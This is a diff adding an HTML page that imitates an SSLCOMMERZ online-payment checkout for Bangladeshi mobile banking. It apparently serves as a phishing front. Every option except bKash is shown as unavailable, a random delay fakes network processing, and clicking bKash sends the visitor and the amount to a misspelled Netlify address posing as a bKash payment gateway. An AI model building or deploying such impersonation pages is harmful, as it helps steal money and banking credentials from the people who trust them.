@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Online Payment</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Helvetica Neue', Arial, sans-serif;
+}
+
+body {
+    background: #f4f8fc;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    position: relative;
+}
+
+.container {
+    width: 100%;
+    max-width: 420px;
+    padding: 20px 24px;
+    padding-bottom: 120px;
+    position: relative;
+}
+
+/* Top Action Bar */
+.topbox {
+    background: #ffffff;
+    height: 54px;
+    border-radius: 12px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0 16px;
+    box-shadow: 0 4px 14px rgba(0, 0, 0, 0.03);
+    margin-top: 10px;
+}
+
+.topbox .right-icons {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+}
+
+.icon-btn {
+    background: none;
+    border: none;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+/* Main Header */
+.logo-section {
+    text-align: center;
+    margin-top: 35px;
+}
+
+.ssl-logo-container img {
+    height: 36px;
+    object-fit: contain;
+}
+
+.logo-section h2 {
+    color: #637381;
+    margin-top: 12px;
+    font-size: 26px;
+    font-weight: 600;
+    letter-spacing: -0.5px;
+}
+
+/* Category Button */
+.blueBtn {
+    background: #0056c6;
+    color: #ffffff;
+    text-align: center;
+    padding: 14px;
+    border-radius: 8px;
+    margin-top: 32px;
+    font-size: 16px;
+    font-weight: bold;
+    box-shadow: 0 4px 10px rgba(0, 86, 198, 0.15);
+}
+
+/* Grid Layout */
+.grid {
+    margin-top: 24px;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+}
+
+.card {
+    background: #ffffff;
+    height: 96px;
+    border-radius: 12px;
+    border: 1px solid #eef3f9;
+    position: relative;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
+    padding: 12px;
+    transition: all 0.2s ease;
+    cursor: pointer;
+}
+
+.card img {
+    max-width: 85%;
+    max-height: 80%;
+    object-fit: contain;
+}
+
+/* Disabled Card State */
+.card.disabled {
+    cursor: not-allowed;
+    pointer-events: none;
+}
+
+.card.disabled img {
+    opacity: 0.4;
+}
+
+.badge {
+    position: absolute;
+    top: -1px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #fca0a0;
+    color: #ffffff;
+    font-size: 9.5px;
+    font-weight: 500;
+    padding: 3px 9px;
+    border-bottom-left-radius: 8px;
+    border-bottom-right-radius: 8px;
+    white-space: nowrap;
+}
+
+.footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    background: #dbe9ff;
+    padding: 20px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-top-left-radius: 16px;
+    border-top-right-radius: 16px;
+    box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.04);
+    z-index: 999;
+}
+
+.paybtn {
+    width: 100%;
+    max-width: 420px;
+    text-align: center;
+    color: #0056c6;
+    font-size: 24px;
+    font-weight: 700;
+}
+
+/* --- ১০০% হুবহু ডাবল রিভার্স স্পিনার ওভারলে --- */
+.loading-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(244, 248, 252, 0.85); 
+    display: none; 
+    justify-content: center;
+    align-items: center;
+    z-index: 10000;
+}
+
+.double-spinner {
+    position: relative;
+    width: 60px;
+    height: 60px;
+}
+
+.double-spinner::before {
+    content: "";
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    border: 4px solid transparent;
+    border-top: 4px solid #3182ce;
+    border-bottom: 4px solid #3182ce;
+    border-radius: 50%;
+    animation: spin-clockwise 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+}
+
+.double-spinner::after {
+    content: "";
+    position: absolute;
+    top: 10px; left: 10px; right: 10px; bottom: 10px;
+    border: 4px solid transparent;
+    border-left: 4px solid #3182ce;
+    border-right: 4px solid #3182ce;
+    border-radius: 50%;
+    animation: spin-counter 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+}
+
+@keyframes spin-clockwise {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+@keyframes spin-counter {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(-360deg); }
+}
+</style>
+
+</head>
+<body>
+
+<!-- লোডিং স্ক্রিন এলিমেন্ট -->
+<div class="loading-overlay" id="loading-screen">
+    <div class="double-spinner"></div>
+</div>
+
+<div class="container">
+    <div class="topbox">
+        <button class="icon-btn">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#758494" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
+        </button>
+        <div class="right-icons">
+            <button class="icon-btn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#758494" stroke-width="2"><path d="M5 8h14M5 12h14M11 16h3M4 4h16a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z"></path></svg></button>
+            <button class="icon-btn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#758494" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button>
+        </div>
+    </div>
+
+    <div class="logo-section">
+        <div class="ssl-logo-container">
+            <img src="https://i.im.ge/QMA22G8/image_search_1782976139541.png" alt="SSLCOMMERZ">
+        </div>
+        <h2>Online Payment</h2>
+    </div>
+
+    <div class="blueBtn">মোবাইল ব্যাংকিং</div>
+
+    <div class="grid">
+        <!-- bKash -->
+        <div id="checkout-bkash-btn" class="card">
+            <img src="https://i.im.ge/QMIIf4X/image_search_1779412585372.png" alt="bKash">
+        </div>
+
+        <!-- Nagad -->
+        <div class="card disabled">
+            <div class="badge">Temporary Unavailable</div>
+            <img src="https://i.im.ge/QMIIzq8/image_search_1779412606642.png" alt="Nagad">
+        </div>
+
+        <!-- Rocket -->
+        <div class="card disabled">
+            <div class="badge">Temporary Unavailable</div>
+            <img src="https://i.im.ge/QMIIV39/image_search_1779412562964.webp" alt="Rocket">
+        </div>
+
+        <!-- Upay -->
+        <div class="card disabled">
+            <div class="badge">Temporary Unavailable</div>
+            <img src="https://i.im.ge/QMIIKLK/image_search_1779412647061.png" alt="Upay">
+        </div>
+    </div>
+</div>
+
+<div class="footer">
+    <!-- আপনার রিকোয়েস্ট অনুযায়ী ডিফল্টভাবে এখানে 0.00 করা হয়েছে -->
+    <div class="paybtn">Pay <span id="dynamicAmount">0.00</span> BDT</div>
+</div>
+
+<script>
+    // বৈশ্বিক ভেরিয়েবল যেখানে ফাইনাল এমাউন্ট জমা থাকবে (.০০ ছাড়া)
+    let finalAmountToPass = "0";
+
+    // --- ১. প্রথম ধাপ: অন্য ওয়েবসাইট থেকে ইউআরএল (URL) এর মাধ্যমে প্রাইস গ্রহণ করা ---
+    document.addEventListener('DOMContentLoaded', () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const amountValue = urlParams.get("amount");
+        const displayElement = document.getElementById("dynamicAmount");
+
+        if (amountValue && !isNaN(amountValue) && parseFloat(amountValue) > 0) {
+            // অন্য সাইট থেকে ডাটা আসলে তা ২ দশমিক ঘরসহ (যেমন: 99.00) মেইন স্ক্রিনে দেখাবে
+            displayElement.innerText = parseFloat(amountValue).toFixed(2);
+            
+            // পরবর্তী বিকাশ পেজে পাঠানোর জন্য শুধু মূল সংখ্যাটি ফিল্টার করে রাখা (.০০ বাদে)
+            finalAmountToPass = Math.floor(parseFloat(amountValue)).toString();
+        } else {
+            // যদি সরাসরি কেউ ওপেন করে তবে ডিফল্ট 0.00 দেখাবে
+            displayElement.innerText = "0.00";
+            finalAmountToPass = "0";
+        }
+    });
+
+    // --- ২. দ্বিতীয় ধাপ: বিকাশে ক্লিক করলে অ্যানিমেশন হয়ে ডাইনামিক প্রাইস পাঠানো ---
+    document.getElementById('checkout-bkash-btn').addEventListener('click', function() {
+        
+        // ১০০% হুবহু ডাবল রিভার্স স্পিনার অ্যানিমেশন চালু করা
+        document.getElementById('loading-screen').style.display = 'flex';
+        
+        // ১.৫ সেকেন্ড থেকে ৩.০ সেকেন্ডের মধ্যে একটি র্যান্ডম নেটওয়ার্ক টাইম জেনারেট করা
+        const randomLoadingTime = Math.floor(Math.random() * (3000 - 1500 + 1)) + 1500;
+        
+        setTimeout(function() {
+            // আপনার দেওয়া নেটলিফাই বিকাশ পেমেন্ট পেজের লিংক
+            const bkashPageUrl = "https://bkash-payment-getway.netlify.app/"; 
+            
+            // দশমিক ছাড়া ক্লিন ডাইনামিক প্রাইস পাস হবে
+            window.location.href = bkashPageUrl + "?amount=" + finalAmountToPass;
+        }, randomLoadingTime);
+    });
+</script>
+
+</body>
+</html>
